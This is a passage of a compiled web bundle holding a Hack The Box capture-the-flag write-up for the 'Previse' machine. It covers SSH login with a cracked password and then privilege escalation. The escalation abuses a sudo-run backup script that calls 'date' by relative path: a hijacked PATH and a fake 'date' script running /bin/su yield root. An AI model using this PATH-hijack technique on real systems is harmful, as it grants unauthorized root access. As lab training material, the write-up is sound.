soon enough. At that point, the permissions on user.txt won't matter."),(0,s.kt)("p",null,"After some time, the hash was successfully cracked. "),(0,s.kt)("h3",{id:"obtaining-the-user-flag"},"Obtaining the USER Flag"),(0,s.kt)("p",null,"Let's see if we can use our newfound password to ssh into Previse as user ",(0,s.kt)("inlineCode",{parentName:"p"},"m4lwhere"),"."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"\u250c[slak]\u2500[tun0:10.10.14.70]\u2500[/home/slak]\n\u2514>> ssh m4lwhere@10.10.11.104\nThe authenticity of host '10.10.11.104 (10.10.11.104)' can't be established.\nECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.104' (ECDSA) to the list of known hosts.\nm4lwhere@10.10.11.104's password: \nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu Dec 23 14:08:52 UTC 2021\n\n  System load:  0.0               Processes:           221\n  Usage of /:   51.3% of 4.85GB   Users logged in:     1\n  Memory usage: 39%               IP address for eth0: 10.10.11.104\n  Swap usage:   0%\n\n\n0 updates can be applied immediately.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Thu Dec 23 13:52:12 2021 from 10.10.16.52\nm4lwhere@previse:~$ \n")),(0,s.kt)("p",null,"Success! Now to read the USER flag:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"m4lwhere@previse:~$ cat user.txt\n<REDACTED>\n")),(0,s.kt)("p",null,"HTB accepted the flag, but we're not quite done yet; the SYSTEM flag remains."),(0,s.kt)("h3",{id:"escalating-privileges"},"Escalating Privileges"),(0,s.kt)("p",null,"Executing ",(0,s.kt)("a",{parentName:"p",href:"https://explainshell.com/explain?cmd=sudo+-l"},(0,s.kt)("inlineCode",{parentName:"a"},"sudo -l"))," reveals that:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"User m4lwhere may run the following commands on previse:\n (root) /opt/scripts/access_backup.sh\n")),(0,s.kt)("p",null,"Interesting \u2014 here is the contents of access_backup.sh:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'#!/bin/bash\n\n# We always make sure to store logs, we take security SERIOUSLY here\n\n# I know I shouldnt run this as root but I cant figure it out programmatically on my account\n# This is configured to run with cron, added to sudo so I can run as needed - we\'ll fix it later when there\'s time\n\ngzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz\ngzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz\n')),(0,s.kt)("p",null,"Examining the script, it looks like development negligence turned in my favor. Both the ",(0,s.kt)("inlineCode",{parentName:"p"},"gzip")," and ",(0,s.kt)("inlineCode",{parentName:"p"},"date")," binaries are referenced relatively; therefore, we can edit PATH to point to my own ",(0,s.kt)("inlineCode",{parentName:"p"},"gzip"),"/",(0,s.kt)("inlineCode",{parentName:"p"},"date")," script(s). Consider the following commands, given that I have created a ",(0,s.kt)("inlineCode",{parentName:"p"},"date")," program in ",(0,s.kt)("inlineCode",{parentName:"p"},"/home/m4lwhere"),":"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"m4lwhere@previse:~$ export PATH=:/home/m4lwhere\nm4lwhere@previse:~$ /bin/cat date\n#!/bin/bash\n/bin/su\nm4lwhere@previse:~$ /usr/bin/sudo /opt/scripts/access_backup.sh \nroot@previse:/home/m4lwhere# \n")),(0,s.kt)("p",null,"Root access has been granted!"),(0,s.kt)("h3",{id:"obtaining-the-system-flag"},"Obtaining the SYSTEM Flag"),(0,s.kt)("p",null,"All that is left is to print the SYSTEM flag:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"root@previse:/home/m4lwhere# ls /root\nroot.txt\nroot@previse:/home/m4lwhere# cat /root/root.txt\n<REDACTED>\n")),(0,s.kt)("p",null,"And there it is \u2014 the SYSTEM flag! The flag was accepted by HTB; thus, ",(0,s.kt)("a",{parentName:"p",href:"https://www.hackthebox.com/achievement/machine/787255/373"},"Previse is complete"),"."),(0,s.kt)("h2",{id:"conclusion"},"Conclusion"),(0,s.kt)("p",null,"This was a very fun CTF overall, which I admit I found challenging despite the low difficulty rating relative to other HTB challenges. I had a lot of fun working on Previse, and it felt noticeably more accessible to me than some other HTB machines I've attempted. I learned a lot and I encourage others interested in red team security activities to give their own best effort toward this challenge... even if they end up with 50+ open browser tabs at the end like I did."),(0,s.kt)("p",null,"I hope you found this guide helpful or inspirational. Thank you so much for reading, and check back soon for more activity reports."),(0,s.kt)("p",null,"-Sid"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://www.hackthebox.com/achievement/machine/787255/373"},"https://www.hackthebox.com/achievement/machine/787255/373")," ",(0,s.kt)("img",{alt:"https://www.hackthebox.com/achievement/machine/787255/373",src:t(8007).Z})),(0,s.kt)("p",null,(0,s.kt)("em",{parentName:"p"},"Feedback? ",(0,s.kt)("a",{parentName:"em",href:"mailto:contact@swlacy.com?subject=Suggestion%20Regarding%20Previse%20Report"},"I can be reached via email"),".")))}u.isMDXComponent=!0},5504:function(e,n,t){n.Z=t.p+"assets/images/previse1-7c5f66c742e24fdf8231cbba82905b77.png"},348:function(e,n,t){n.Z=t.p+"assets/images/previse2-b6c8850e9b7a9481b19c2eabe6815a46.png"},2045:function(e,n,t){n.Z=t.p+"assets/images/previse3-d285d947260879dbf4d01bc8236ba62f.png"},9803:function(e,n,t){n.Z=t.p+"assets/images/previse4-814692cb259141de71725fb47122a25d.png"},7924:function(e,n,t){n.Z=t.p+"assets/images/previse5-14698d9d0d20ee11c70e349e4f66c769.png"},8007:function(e,n,t){n.Z=t.p+"assets/images/previse6-f814f1c57b721dd54edb67eed863a9ae.png"}}]);